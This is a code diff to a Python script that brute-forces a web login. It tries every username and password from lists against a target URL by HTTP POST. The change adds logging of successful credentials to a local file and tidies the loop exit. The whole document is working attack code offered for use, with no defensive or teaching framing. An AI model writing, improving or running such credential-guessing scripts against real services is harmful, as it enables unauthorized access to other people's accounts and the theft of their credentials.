@@ -8,5 +8,14 @@ for username in username_list:
     for password in password_list:
         response = requests.post(target_url, data={"username": username, "password": password})
         if response.status_code == 200:
-            print("Login successful - username: " + username + " password: " + password)
+            print(f"Login successful - username: {username} password: {password}")
+            # save successful login credentials to a file
+            with open("credentials.txt", "a") as f:
+                f.write(f"username: {username} password: {password}\n")
+            # exit the loop if login is successful
             break
+    else:
+        continue
+    break
+else:
+    print("Login unsuccessful. Credentials not found.")
